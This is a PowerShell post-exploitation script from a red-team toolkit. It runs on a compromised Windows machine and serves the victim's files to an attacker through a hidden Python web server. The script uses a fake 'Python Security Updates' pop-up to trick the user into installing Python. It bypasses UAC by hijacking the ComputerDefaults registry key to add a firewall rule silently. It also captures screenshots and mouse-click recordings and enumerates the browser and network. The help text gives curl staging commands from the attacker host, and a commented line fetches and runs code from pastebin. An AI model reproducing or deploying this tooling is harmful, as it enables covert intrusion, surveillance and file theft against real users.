<#
.SYNOPSIS
   cmdlet to read/browse/download files from compromised target machine (windows).

   Author: r00t-3xp10it (SSA RedTeam @2020)
   Tested Under: Windows 10 - Build 18363
   Required Dependencies: python (http.server)
   Optional Dependencies: netsh|curl|Start-BitsTransfer
   PS cmdlet Dev version: v1.12

.DESCRIPTION
   This cmdlet has written to assist venom amsi evasion reverse tcp shell's (agents)
   with the ability to download files from target machine. It uses social engineering
   to trick target user into installing Python-3.9.0.exe as a python security update
   (if target user does not have python installed). This cmdlet also has the ability
   to capture Screenshots of MouseClicks [<-SPsr>] and browser enumeration [<-SEnum>]
   And uses curl native binary (LolBin) OR Start-BitsTransfer to download the correct
   python windows installer architecture binary from www.python.org oficial webpage.
   The follow 4 steps describes how to use webserver.ps1 on venom reverse tcp shell(s)

   1º - Place this cmdlet in attacker machine apache2 webroot
        execute: cp webserver.ps1 /var/www/html/webserver.ps1

   2º - Then upload webserver using the reverse tcp shell (prompt)
        execute: cmd /c curl http://LHOST/webserver.ps1 -o %tmp%\webserver.ps1

   3º - Then remote execute webserver using the reverse tcp shell (prompt)
        execute: powershell -W 1 -File "$Env:TMP\webserver.ps1" -SForce 3 -SEnum True

   4º - In attacker PC access 'http://RHOST:8086/' (web browser) to read/browse/download files.

.NOTES
   Use 'CTRL+C' to stop webserver (local)

   cmd /c taskkill /F /IM Python.exe
   Kill remote Python process's (stop webserver|python)

   If executed with administrator privileges then this cmdlet add's
   one firewall rule that allow server silent connections. IF the shell
   does not have admin privs then 'ComputerDefaults.exe' EOP will be used
   to add the firewall rule to prevent 'incomming connections' warning.

   If executed without administrator privileges then this cmdlet
   its limmited to directory ACL permissions (R)(W) attributes.
   NOTE: 'Get-Acl' powershell cmdlet displays directory attributes.

.EXAMPLE
   PS C:\> Get-Help .\webserver.ps1 -full
   Access This cmdlet Comment_Based_Help

.EXAMPLE
   PS C:\> .\webserver.ps1
   Spawn webserver in '$Env:UserProfile' directory on port 8086

.EXAMPLE
   PS C:\> .\webserver.ps1 -SPath "C:\Users\pedro\Desktop"
   Spawn webserver in the sellected directory on port 8086

.EXAMPLE
   PS C:\> .\webserver.ps1 -SPath "$Env:TMP" -SPort 8111
   Spawn webserver in the sellected directory on port 8111

.EXAMPLE
   PS C:\> .\webserver.ps1 -SPath "$Env:TMP" -SBind 192.168.1.72
   Spawn webserver in the sellected directory and bind to ip addr

.EXAMPLE
   PS C:\> .\webserver.ps1 -SForce 10 -STime 30
   force remote user to execute the python windows installer
   (10 attempts) and use 30 Sec delay between install attempts.
   'Its the syntax that gives us more guarantees of success'.

.EXAMPLE
   PS C:\> .\webserver.ps1 -SRec 5 -SRDelay 2
   Capture 5 desktop screenshots with 2 seconds of delay
   between each capture. before executing the @webserver.

.EXAMPLE
   PS C:\> .\webserver.ps1 -SPsr 8
   Capture Screenshots of MouseClicks for 8 seconds
   And store the capture under '$Env:TMP' remote directory
   'The minimum capture time its 8 seconds and 100 screenshots max'.

.EXAMPLE
   PS C:\> .\webserver.ps1 -SEnum True
   Remote Host Web Browser Enumeration, DNS Records, DHCP
   User-Agent, Default Browser, TCP Headers, MainWindowTitle

.EXAMPLE
   PS C:\> .\webserver.ps1 -Sessions List
   Enumerate active @webserver sessions.
   To use multiple sessions dont change directory.
   This parameter can NOT be used together with other parameters

.EXAMPLE
   PS C:\> .\webserver.ps1 -SKill 2
   Kill python (webserver) remote process in 'xx' seconds.
   This parameter can NOT be used together with other parameters
   because after completing is task (terminate server) it exits.

.INPUTS
   None. You cannot pipe objects into webserver.ps1

.OUTPUTS
   None. This cmdlet does not produce outputs (remote)
   But if executed (local) it will produce terminal displays.

.LINK
    https://github.com/r00t-3xp10it/venom
    https://github.com/r00t-3xp10it/venom/tree/master/aux/webserver.ps1
    https://github.com/r00t-3xp10it/venom/wiki/CmdLine-&-Scripts-for-reverse-TCP-shell-addicts
    https://github.com/r00t-3xp10it/venom/wiki/cmdlet-to-download-files-from-compromised-target-machine
#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$SPath="$Env:UserProfile",
   [string]$Sessions="False",
   [string]$SEnum="False",
   [int]$SPort='8086',
   [int]$SRDelay='2',
   [int]$STime='26',
   [int]$SForce='0',
   [int]$SKill='0',
   [int]$SPsr='0',
   [int]$SRec='0',
   [string]$SBind
)

$HiddeMsgBox = $False
$CmdletVersion = "v1.12"
$Initial_Path = (pwd).Path
$Server_hostName = (hostname)
$Server_Working_Dir = "$SPath"
$Remote_Server_Port = "$Sport"
$IsArch64 = [Environment]::Is64BitOperatingSystem
If($IsArch64 -ieq $True){
   $BinName = "python-3.9.0-amd64.exe"
}Else{
   $BinName = "python-3.9.0.exe"
}

## Simple (SE) HTTP WebServer Banner
$host.UI.RawUI.WindowTitle = "@webserver $CmdletVersion {SSA@RedTeam}"
$Banner = @"

░░     ░░ ░░░░░░░ ░░░░░░  ░░░░░░░ ░░░░░░░ ░░░░░░  ░░    ░░ ░░░░░░░ ░░░░░░  
▒▒     ▒▒ ▒▒      ▒▒   ▒▒ ▒▒      ▒▒      ▒▒   ▒▒ ▒▒    ▒▒ ▒▒      ▒▒   ▒▒ 
▒▒  ▒  ▒▒ ▒▒▒▒▒   ▒▒▒▒▒▒  ▒▒▒▒▒▒▒ ▒▒▒▒▒   ▒▒▒▒▒▒  ▒▒    ▒▒ ▒▒▒▒▒   ▒▒▒▒▒▒  
▓▓ ▓▓▓ ▓▓ ▓▓      ▓▓   ▓▓      ▓▓ ▓▓      ▓▓   ▓▓  ▓▓  ▓▓  ▓▓      ▓▓   ▓▓ 
 ███ ███  ███████ ██████  ███████ ███████ ██   ██   ████   ███████ ██   ██ $CmdletVersion
         Simple (SE) HTTP WebServer by:r00t-3xp10it {SSA@RedTeam}

"@;
Clear-Host;
Write-Host $Banner;

If($SKill -gt 0){
$Count = 0 ## Loop counter 
If($SForce -ne '0' -or $SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ieq 'True' -or $Sessions -ieq 'List'){
   write-host "[warning] -SKill parameter can not be used with other parameters .." -ForeGroundColor Yellow
   Start-Sleep -Seconds 1
}

   <#
   .SYNOPSIS
      Kill python (@webserver) remote process(s) in 'xx' seconds

   .EXAMPLE
      PS C:\> .\webserver.ps1 -SKill 2
      Kill python (@webserver) remote process(s) in 2 seconds
   #>

   ## Make sure python (@webserver) process is running on remote system
   write-host "`nKill @webserver python process in: $SKill seconds .." -ForeGroundColor Green
   Start-Sleep -Seconds 1;Write-Host "`nId  Process  Version  Pid   StopTime"
   Write-Host "--  -------  -------  ---   --------" -ForeGroundColor Green
   $ProcessPythonRunning = Get-Process|Select-Object ProcessName|Select-String python
   If($ProcessPythonRunning){
      $TablePid = Get-Process python -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id
      $TableName = Get-Process python -ErrorAction SilentlyContinue|Select-Object -ExpandProperty ProcessName|Select -Last 1
      $ServerVersion = Get-Process python -ErrorAction SilentlyContinue|Select-Object -ExpandProperty ProductVersion|Select -Last 1
      Start-Sleep -Seconds $SKill; # Kill remote python process after 'xx' seconds delay
      taskkill /F /IM python.exe|Out-Null
      If(-not($LASTEXITCODE -eq 0)){
         write-host "$LASTEXITCODE fail to terminate python process(s)" -ForeGroundColor DarkRed -BackgroundColor Cyan
      }
   }Else{
      write-host "$LASTEXITCODE   None active sessions found in $Server_hostName" -ForeGroundColor DarkRed -BackgroundColor Cyan
   }

   ## Create Data Table for Output
   foreach($KeyId in $TablePid){$Count++
      $CloseTime = Get-Date -Format 'HH:mm:ss';Start-Sleep -Seconds 1
      Write-Host "$Count   $TableName   $ServerVersion    $KeyId  $CloseTime"
   }
   If(Test-Path "$Env:TMP\sessions.log"){Remove-Item $Env:TMP\sessions.log -Force}
   write-host "";Start-Sleep -Seconds 1
   exit ## exit @webserver
}

If($Sessions -ieq "List"){
$Count = 0 ## Loop counter
If($SForce -ne '0' -or $SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ieq 'True' -or $SKill -ne '0'){
   write-host "[warning] -Sessions parameter can not be used with other parameters .." -ForeGroundColor Yellow
   Start-Sleep -Seconds 1
}

   <#
   .SYNOPSIS
      Enumerate active @webserver sessions

   .EXAMPLE
      PS C:\> .\webserver.ps1 -Sessions List
      Enumerate active @webserver sessions.
      [Id][StartTime][Bind][Port][Directory]
   #>

   ## Create Data Table for Output
   Write-Host "`nActive Server Sessions" -ForegroundColor DarkGreen
   Write-Host "To use multiple sessions dont change directory." -ForegroundColor DarkGreen
   Write-Host "`nId  StartTime  Bind          Port  Directory"
   Write-Host "--  ---------  ----          ----  ---------" -ForeGroundColor DarkGreen
   If(Test-Path "$Env:TMP\sessions.log"){
      foreach($KeyId in Get-Content "$Env:TMP\sessions.log"){
         $Count++;Start-Sleep -Milliseconds 700
         Write-Host "$Count   $KeyId"
      }
   }Else{
      write-host "$LASTEXITCODE   None active sessions found in $Server_hostName" -ForeGroundColor DarkRed -BackgroundColor Cyan 
   }
   write-host "";Start-Sleep -Seconds 1
   exit ## exit @webserver
}

If($SRec -gt 0){
$Limmit = $SRec+1 ## The number of screenshots to be taken
If($SRDelay -lt '1'){$SRDelay = '1'} ## Screenshots delay time minimum value accepted

   <#
   .SYNOPSIS
      Capture remote desktop screenshot(s)

   .DESCRIPTION
      [<-SRec>] Parameter allow us to take desktop screenshots before
      continue with @webserver execution. The value set in [<-SRec>] parameter
      serve to count how many screenshots we want to capture before continue.

   .EXAMPLE
      PS C:\> .\webserver.ps1 -SRec 5 -SRDelay 2
      Capture 5 desktop screenshots with 2 seconds of delay
      between each capture. before executing the @webserver.
   #>

   ## Loop Function to take more than one screenshot.
   For ($num = 1 ; $num -le $SRec ; $num++){
      write-host "Screenshot $num" -ForeGroundColor Yellow

      $OutPutPath = "$Env:TMP"
      $Dep = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 5 |%{[char]$_})
      $FileName = "$Env:TMP\SHot-"+"$Dep.png"
      If(-not(Test-Path "$OutPutPath")){New-Item $OutPutPath -ItemType Directory -Force}
      Add-Type -AssemblyName System.Windows.Forms
      Add-type -AssemblyName System.Drawing
      $ASLR = [System.Windows.Forms.SystemInformation]::VirtualScreen
      $Height = $ASLR.Height;$Width = $ASLR.Width
      $Top = $ASLR.Top;$Left = $ASLR.Left
      $Console = New-Object System.Drawing.Bitmap $Width, $Height
      $AMD = [System.Drawing.Graphics]::FromImage($Console)
      $AMD.CopyFromScreen($Left, $Top, 0, 0, $Console.Size)
      $Console.Save($FileName) 
      Write-Host "Saved to: $FileName"

      #iex(iwr("https://pastebin.com/raw/bqddWQcy")); ## Script.ps1 (pastebin) FileLess execution ..
      Start-Sleep -Seconds $SRDelay; ## 2 seconds delay between screenshots (default value)
   }
   Write-Host ""
}

If($SPsr -gt 0){
## Random FileName generation
$Rand = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 6 |%{[char]$_})
$CaptureFile = "$Env:TMP\SHot-"+"$Rand.zip"
If($SPsr -lt '8'){$SPsr = '10'} # Set the minimum capture time value

   <#
   .SYNOPSIS
      Capture Screenshots of MouseClicks for 'xx' seconds

   .DESCRIPTION
      This script allow users to Capture target Screenshots of MouseClicks
      with the help of psr.exe native windows 10 (error report service) binary.
      'The capture will be stored under remote-host '$Env:TMP' directory'.
      'The minimum capture time its 8 seconds and 100 screenshots max'.

   .EXAMPLE
      PS C:\> .\webserver.ps1 -SPsr 8
      Capture Screenshots of MouseClicks for 8 seconds
      And store the capture under '$Env:TMP' remote directory.
   #>

   ## Make sure psr.exe (LolBin) exists on remote host
   If(Test-Path "$Env:WINDIR\System32\psr.exe"){
      write-host "Recording $Server_hostName activity for $SPsr seconds .." -ForeGroundColor Green
      write-host "Capture: $CaptureFile" -ForeGroundColor Yellow;Start-Sleep -Seconds 2
      ## Start psr.exe (-WindowStyle hidden) process detach (orphan) from parent process
      Start-Process -WindowStyle hidden powershell -ArgumentList "psr.exe", "/start", "/output $CaptureFile", "/sc 1", "/maxsc 100", "/gui 0;", "Start-Sleep -Seconds $SPsr;", "psr.exe /stop" -ErrorAction SilentlyContinue|Out-Null
      If(-not($LASTEXITCODE -eq 0)){write-host "[abort] @webserver => cant start psr.exe" -ForeGroundColor DarkRed -BackgroundColor Cyan;Start-Sleep -Seconds 2}
   }Else{
      ## PSR.exe (error report service) not found in current system ..
      write-host "[fail] Not found: $Env:WINDIR\System32\psr.exe" -ForeGroundColor DarkRed -BackgroundColor Cyan
      Start-Sleep -Seconds 1
   }
}


$PythonVersion = cmd /c python --version
If(-not($PythonVersion) -or $PythonVersion -ieq $null){
   write-host "python not found, Downloading from python.org" -ForeGroundColor DarkRed -BackgroundColor Cyan
   Start-Sleep -Seconds 1

   <#
   .SYNOPSIS
      Download/Install Python 3.9.0 => http.server (requirement)
      Author: @r00t-3xp10it (venom Social Engineering Function)

   .DESCRIPTION
      Checks target system architecture (x64 or x86) to download from Python
      oficial webpage the comrrespondent python 3.9.0 windows installer if
      target system does not have the python http.server module installed ..

   .NOTES
      This function uses the native (windows 10) curl.exe LolBin to
      download python-3.9.0.exe before remote execute the installer
   #>

   If(cmd /c curl.exe --version){ # <-- Unnecessary step? curl its native (windows 10) rigth?
      ## Download python windows installer and use social engineering to trick user to install it
      write-host "Downloading $BinName from python.org" -ForeGroundColor Green
      cmd /c curl.exe -L -k -s https://www.python.org/ftp/python/3.9.0/$BinName -o %tmp%\$BinName -u SSARedTeam:s3cr3t
      Write-Host "Remote Spawning Social Engineering MsgBox." -ForeGroundColor Green
      powershell (NeW-ObjeCt -ComObjEct Wscript.Shell).Popup("Python Security Updates Available.`nDo you wish to Install them now?",15,"$BinName setup",4+48)|Out-Null
      $HiddeMsgBox = $True
      If(Test-Path "$Env:TMP\$BinName"){
         ## Execute python windows installer (Default = just one time)
         powershell Start-Process -FilePath "$Env:TMP\$BinName" -Wait
         If(Test-Path "$Env:TMP\$BinName"){Remove-Item "$Env:TMP\$BinName" -Force}
      }Else{
         $SForce = '2'
         ## Remote File: $Env:TMP\python-3.9.0.exe not found ..
         # Activate -SForce parameter to use powershell Start-BitsTransfer cmdlet insted of curl.exe
         Write-Host "[File] Not found: $Env:TMP\$BinName" -ForeGroundColor DarkRed -BackgroundColor Cyan;Start-Sleep -Seconds 1
         Write-Host "[Auto] Activate: -SForce 2 parameter to use powershell Start-BitsTransfer" -ForeGroundColor Yellow;Start-Sleep -Seconds 2
      }
   }Else{
      $SForce = '2'
      ## LolBin downloader (curl) not found in current system.
      # Activate -SForce parameter to use powershell Start-BitsTransfer cmdlet insted of curl.exe
      Write-Host "[Appl] Not found: Curl downloder (LolBin)" -ForeGroundColor DarkRed -BackgroundColor Cyan;Start-Sleep -Seconds 1
      Write-Host "[Auto] Activate: -SForce 2 parameter to use powershell Start-BitsTransfer" -ForeGroundColor Yellow;Start-Sleep -Seconds 2
   }
}

If($SForce -gt 0){
$i = 0 ## Loop counter
$Success = $False ## Python installation status

   <#
   .SYNOPSIS
      parameter: -SForce 2 -STime 26
      force remote user to execute the python windows installer
      (2 attempts) and use 30 Seconds between install attempts.
      Author: @r00t-3xp10it (venom Social Engineering Function)

   .DESCRIPTION
      This parameter forces the installation of python-3.9.0.exe
      by looping between python-3.9.0.exe executions until python
      its installed OR the number of attempts set by user in -SForce
      parameter its reached. Example of how to to force the install
      of python in remote host 3 times: .\webserver.ps1 -SForce 3

   .NOTES
      'Its the syntax that gives us more guarantees of success'.
      This function uses powershell Start-BitsTransfer cmdlet to
      download python-3.9.0.exe before remote execute the installer
   #>

   ## Loop Function (Social Engineering)
   # Hint: $i++ increases the nº of the $i counter
   Do {
       $check = cmd /c python --version
       ## check target host python version
       If(-not($check) -or $check -ieq $null){
           $i++;Write-Host "[$i] Python Installation: not found." -ForeGroundColor DarkRed -BackgroundColor Cyan
           ## Test if installler exists on remote directory
           If(Test-Path "$Env:TMP\$BinName"){
              Write-Host "[$i] python windows installer: found." -ForeGroundColor Green;Start-Sleep -Seconds 1
              If($HiddeMsgBox -ieq $False){
                  Write-Host "[$i] Remote Spawning Social Engineering MsgBox." -ForeGroundColor Green;Start-Sleep -Seconds 1
                  powershell (NeW-ObjeCt -ComObjEct Wscript.Shell).Popup("Python Security Updates Available.`nDo you wish to Install them now?",15,"$Server_hostName - $BinName setup",4+48)|Out-Null;
                  $HiddeMsgBox = $True
              }
              ## Execute python windows installer
              powershell Start-Process -FilePath "$Env:TMP\$BinName" -Wait
              Start-Sleep -Seconds $STime; # 16+4 = 20 seconds between executions (default value)
           }Else{
              ## python windows installer not found, download it ..
              Write-Host "[$i] python windows installer: not found." -ForeGroundColor DarkRed -BackgroundColor Cyan;Start-Sleep -Seconds 1
              Write-Host "[$i] Downloading: $Env:TMP\$BinName" -ForeGroundColor DarkRed -BackgroundColor Cyan;Start-Sleep -Seconds 2
              powershell Start-BitsTransfer -priority foreground -Source https://www.python.org/ftp/python/3.9.0/$BinName -Destination $Env:TMP\$BinName
           }
        ## Python Successfull Installed ..
        # Mark $Success variable to $True to break SE loop
        }Else{
           $i++;Write-Host "[$i] Python Installation: found." -ForeGroundColor Green
           Start-Sleep -Seconds 2;$Success = $True
        }
   }
   ## DO Loop UNTIL $i (Loop set by user or default value counter) reaches the
   # number input on parameter -SForce OR: if python is $success=$True (found).
   Until($i -eq $SForce -or $Success -ieq $True)
}


$Installation = cmd /c python --version
## Make Sure python http.server requirement its satisfied.
If(-not($Installation) -or $Installation -ieq $null){
   write-host "[Abort] This cmdlet cant find python installation." -ForeGroundColor DarkRed -BackgroundColor Cyan;Start-Sleep -Seconds 1
   write-host "[Force] the install of python by remote user: .\webserver.ps1 -SForce 15 -STime 26" -ForeGroundColor Yellow;write-host "";Start-Sleep -Seconds 2
   exit ## Exit @webserver

}Else{

   write-host "All Python requirements are satisfied." -ForeGroundColor Green
   Start-Sleep -Seconds 1
   If(-not($SBind) -or $SBind -ieq $null){
      ## Grab remote target IPv4 ip address (to --bind)
      $Remote_Host = (Test-Connection -ComputerName (hostname) -Count 1 -ErrorAction SilentlyContinue).IPV4Address.IPAddressToString
   }Else{
      ## Use the cmdlet -SBind parameter (to --bind)
      $Remote_Host = "$SBind"
   }
   
   ## @shanty debug report under: windows 10 PRO
   # Add Firewall Rule (silent) to prevent python (server) connection warnings (admin privs)
   # IF the shell does not have admin privs, then ComputerDefaults.exe EOP will be used to add the rule.
   $PythonPath = (Get-ChildItem -Path $Env:PROGRAMFILES, ${Env:PROGRAMFILES(x86)}, $Env:LOCALAPPDATA\Programs -Filter python.exe -Recurse -ErrorAction SilentlyContinue -Force).fullname|findstr /V "\Lib"
   If(-not($LASTEXITCODE -eq 0)){# Use cmd.exe 'dir' command insted of PS 'Get-ChildItem' to find python path
      $SearchPath = cmd /c dir /B /S $Env:PROGRAMFILES, ${Env:PROGRAMFILES(x86)}, $Env:LOCALAPPDATA\Programs|Select-String -Pattern "python.exe"|findstr /V "\Lib \Microsoft"
      If(-not($LASTEXITCODE -eq 0)){# Use python interpreter to find the python path
         $SearchPath = python -c "import os, sys; print(os.path.dirname(sys.executable))"
         $PythonPath = "$SearchPath"+"\python.exe"
      }Else{
         $PythonPath = $SearchPath|Where {$_ -ne ''}
      }
   }

   $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544");
   If($IsClientAdmin){# Check if rule allready exists on remote firewall
      netsh advfirewall firewall show rule name="python.exe"|Out-Null
      If(-not($LASTEXITCODE -eq 0)){
         write-host "[bypass] Adding python.exe firewall rule." -ForeGroundColor Yellow
         netsh advfirewall firewall add rule name="python.exe" description="venom v1.0.17 - python (SE) webserver" program="$PythonPath" dir=in action=allow protocol=TCP enable=yes|Out-Null
      }
   }Else{
      ## Shell (webserver) running under UserLand privs
      # Check if rule allready exists on remote firewall
      netsh advfirewall firewall show rule name="python.exe"|Out-Null
      If(-not($LASTEXITCODE -eq 0)){# Use ComputerDefaults EOP to add rule to remote firewall
         write-host "[bypass] Using EOP technic to add firewall rule." -ForeGroundColor Yellow
         $Command = "netsh advfirewall firewall add rule name=`"python.exe`" description=`"venom v1.0.17 - python (SE) webserver`" program=`"$PythonPath`" dir=in action=allow protocol=TCP enable=yes"
         ## Adding to remote regedit the 'ComputerDefaults' hijacking keys (EOP - UAC Bypass - UserLand)
         New-Item "HKCU:\Software\Classes\ms-settings\shell\open\Command" -Force -EA SilentlyContinue|Out-Null
         Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value '' -Force|Out-Null
         Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "$Command" -Force|Out-Null
         Start-Sleep -Milliseconds 10;Start-Process -WindowStyle hidden "$Env:WINDIR\System32\ComputerDefaults.exe" -Wait
         Remove-Item "HKCU:\Software\Classes\ms-settings\shell" -Recurse -Force|Out-Null
      }
   }

   ## Start python http server (new process -WindowStyle hidden) on sellect Ip/Path/Port
   Start-Process -WindowStyle hidden python -ArgumentList "-m http.server", "--directory $Server_Working_Dir", "--bind $Remote_Host", "$Remote_Server_Port" -ErrorAction SilentlyContinue|Out-Null
   If($? -ieq $True){write-host "Serving HTTP on http://${Remote_Host}:${Remote_Server_Port}/ on directory '$Server_Working_Dir'" -ForeGroundColor Green
      $ServerTime = Get-Date -Format 'HH:mm:ss';write-host ""
      echo "$ServerTime   $Remote_Host  $Remote_Server_Port  $Server_Working_Dir" >> $Env:TMP\sessions.log
   }Else{
      write-host "[$LASTEXITCODE] fail Executing the @webserver .." -ForeGroundColor Red -BackgroundColor Black
      write-host "";Start-Sleep -Seconds 1
   }

   ## WebBrowser Enumeration (-SEnum True)
   If($SEnum -ieq "True"){

      <#
      .SYNOPSIS
         Remote Host Web Browser Simple Enumeration

      .DESCRIPTION
         Remote Host Web Browser Enumeration, DNS Records, DHCP
         User-Agent, Default Browser, TCP Headers, MainWindowTitle

      .EXAMPLE
         PS C:\> .\webserver.ps1 -SEnum True
         Remote Host Web Browser Simple Enumeration ..
      #>

      ## Internal Variable Declarations
      $SSID = (Get-WmiObject Win32_OperatingSystem).Caption
      $OsVersion = (Get-WmiObject Win32_OperatingSystem).Version
      $Remote_Host = (Test-Connection -ComputerName (hostname) -Count 1 -ErrorAction SilentlyContinue).IPV4Address.IPAddressToString
      $recon_age = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\internet settings" -Name 'User Agent' -ErrorAction SilentlyContinue|Select-Object -ExpandProperty 'User Agent'
      $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544");If($IsClientAdmin){$report = "Administrator"}Else{$report = "UserLand"}
      $DefaultBrowser = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\https\UserChoice' -ErrorAction SilentlyContinue).ProgId
      If($DefaultBrowser){$Parse_Browser_Data = $DefaultBrowser.split("-")[0] -replace 'URL','' -replace 'HTML','' -replace '.HTTPS',''}else{$Parse_Browser_Data = "Not Found"}
      $BrowserPath = Get-Process $Parse_Browser_Data -ErrorAction SilentlyContinue|Select -Last 1|Select-Object -Expandproperty Path
      $Browserversion = Get-Process $Parse_Browser_Data -ErrorAction SilentlyContinue|Select -Last 1|Select-Object -Expandproperty ProductVersion
      $StoreData = Get-Process $Parse_Browser_Data -ErrorAction SilentlyContinue|Select -ExpandProperty MainWindowTitle
      $ActiveTabName = $StoreData | where {$_ -ne ""}

         ## WebBrowser Headers Enumeration (pure powershell)
         $Url = "http://${Remote_Host}:${Remote_Server_Port}/"
         $request = [System.Net.WebRequest]::Create( $Url )
         $headers = $request.GetResponse().Headers
         $headers.AllKeys |
            Select-Object @{ Name = "Key"; Expression = { $_ }},
            @{ Name = "Value"; Expression = { $headers.GetValues( $_ ) } }

            ## Capture python http web page title (Invoke-WebRequest)
            $Site = Invoke-WebRequest $url;$WebContent = $Site.Content|findstr "title"
            $WebTitle = $WebContent -replace '<title>','' -replace '</title>',''

         ## Build output Table
         Write-Host "Enumeration"
         write-host "-----------"
         write-host "Shell Privs    : $report"
         write-host "Remote Host    : $Remote_Host"
         Write-Host "LogonServer    : ${Env:USERDOMAIN}\\${Env:USERNAME}"
         write-host "OS version     : $OsVersion"
         write-host "OperatingSystem: $SSID"
         write-host "DefaultBrowser : $Parse_Browser_Data ($Browserversion)"
         write-host "User-Agent     : $recon_age"
         write-host "WebBrowserPath : $BrowserPath"
         write-host "ActiveTabName  : $ActiveTabName"
         write-host "WebServerTitle : $WebTitle`n"

      ## TCP Connections enumeration
      echo "" > $Env:TMP\logfile.log
      echo "Connection Status" >> $Env:TMP\logfile.log
      echo "-----------------" >> $Env:TMP\logfile.log
      echo "  Proto  Local Address          Foreign Address        State           PID" >> $Env:TMP\logfile.log
      cmd /c netstat -ano|findstr "${Remote_Host}:${Remote_Server_Port}"|findstr "LISTENING ESTABLISHED" >> $Env:TMP\logfile.log
      echo "" >> $Env:TMP\logfile.log
      echo "Established Connections" >> $Env:TMP\logfile.log
      echo "-----------------------" >> $Env:TMP\logfile.log
      echo "  Proto  Local Address          Foreign Address        State           PID" >> $Env:TMP\logfile.log
      cmd /c netstat -ano|findstr "ESTABLISHED"|findstr /V "::"|findstr /V "["|findstr /V "UDP" >> $Env:TMP\logfile.log
      Get-Content $Env:TMP\logfile.log;Remove-Item $Env:TMP\logfile.log -Force            
   }
}

## Final Notes:
# The 'cmd /c' syscall its used in certain ocasions in this cmdlet only because
# it produces less error outputs in terminal prompt compared with PowerShell.
If(Test-Path "$Env:TMP\$BinName"){Remove-Item "$Env:TMP\$BinName" -Force}
Start-Sleep -Seconds 1
exit

